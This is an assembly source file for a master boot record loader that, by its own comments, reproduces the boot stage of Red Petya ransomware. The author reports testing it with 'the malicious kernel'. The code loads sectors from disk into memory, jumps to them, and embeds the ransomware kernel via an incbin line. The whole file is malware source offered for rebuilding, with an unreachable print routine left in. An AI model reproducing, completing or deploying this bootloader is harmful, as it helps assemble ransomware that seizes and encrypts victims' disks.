; Mess source, soon i will fix it...
; I have tested this with the malicious kernel and boots correctly.

; Now the goal is get the kernel source and make it work
; (Red petya, currently does not read any executable header)

BITS 16
org 0x7c00

start_point:
	cli
	xor     eax, eax
	mov     ss, ax
	mov     es, ax
	mov     ds, ax
	mov     sp, 7C00h

	sti
	mov     [ds:7C93h], dl
	mov     eax, 20h ; ' '
	mov     ebx, 22h ; '"'
	mov     cx, 8000h

loc_21:                                
	call    sub_38
	dec     eax
	cmp     eax, 0
	jnz     loc_21
	mov     eax, [ds:8000h]
	jmp     0:8000h

loc_35:                                 
	hlt

; =============== S U B R O U T I N E =======================================

sub_38:
	push    eax
	xor     eax, eax
	push    dx
	push    si
	push    di

loc_40:                                 
	push    eax
	push    ebx
	mov     di, sp
	push    eax
	push    ebx
	push    es
	push    cx

loc_4C:                                 
	push    1
	push    10h
	mov     si, sp
	mov     dl, [ds:7C93h]
	mov     ah, 42h ; 'B'
	int     13h             
	mov     sp, di
	pop     ebx
	pop     eax
	jnb     loc_6A
	push    ax
	xor     ah, ah
	int     13h             
	pop     ax
	jmp     loc_40


loc_6A:                                 
	add     ebx, 1
	adc     eax, 0
	add     cx, 200h
	jnb     loc_7F
	mov     dx, es
	add     dh, 10h
	mov     es, dx


loc_7F:                                 
	pop     di
	pop     si
	pop     dx
	pop     eax
	retn

	pusha
	mov     ah, 0Eh

loc_88:                                 
	lodsb
	cmp     al, 0
	jz      loc_91
	int     10h     
	jmp     loc_88

loc_91:                                 
	popa
	retn

times 510 - ($-$$) db 0
dw 0xaa55

incbin "kernel.pt2"